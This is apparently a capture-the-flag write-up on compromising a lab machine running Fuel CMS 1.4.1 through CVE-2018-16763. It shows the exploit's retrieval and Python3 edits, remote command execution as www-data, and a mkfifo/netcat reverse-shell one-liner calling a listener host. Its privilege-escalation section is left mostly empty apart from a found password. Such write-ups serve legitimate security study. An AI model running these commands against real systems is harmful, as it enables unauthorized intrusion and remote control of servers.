## Summary

Linux machine running Fuel CMS 1.4.1, vulnerable to a Remote Code Execution exploit (CVE-2018-16763). Initial access obtained via a Python exploit that abuses a PHP injection flaw. Privilege escalation achieved by finding database credentials in a CMS config file and reusing the root password.

## Exploitation

### CVE-2018-16763 — Remote Code Execution

Copied the exploit:

```bash
searchsploit -m linux/webapps/47138.py
```

Modified `47138.py` for Python3 compatibility:

```python
# Changed URL
url = "http://10.80.135.153"

# Removed proxy
proxy = {}

# Python3 fixes
xxxx = input('cmd:')
import urllib.parse
# urllib.quote → urllib.parse.quote
# print r.text → print(r.text)
# raw_input → input
```

Launched the exploit:

```bash
python3 47138.py
```

Verified RCE:

```
cmd: id
system uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Result:** RCE as `www-data` ✅

### Upgrading to a real reverse shell

The exploit shell is non-interactive — can't use `su` or read flags with quotes easily.

Started a listener:

```bash
nc -lvnp 5555
```

Sent a reverse shell via the exploit:

```
cmd: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.80.142.207 5555 >/tmp/f
```

**Result:** Reverse shell received ✅

Stabilized the shell:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

## Privilege Escalation

### Credentials in CMS config file

```bash

```

**Found:**

```

# Password: mememe
```

## Lessons Learned

- Always check `robots.txt` — it revealed the `/fuel/` admin panel immediately
- Default credentials (`admin:admin`) are still extremely common on CMS installations
- CVE-2018-16763 is a good example of how PHP eval/injection leads to RCE
- Config files often contain reused passwords — always check `/var/www/html/*/config/`
- A non-interactive shell limits what you can do — always upgrade to a full TTY
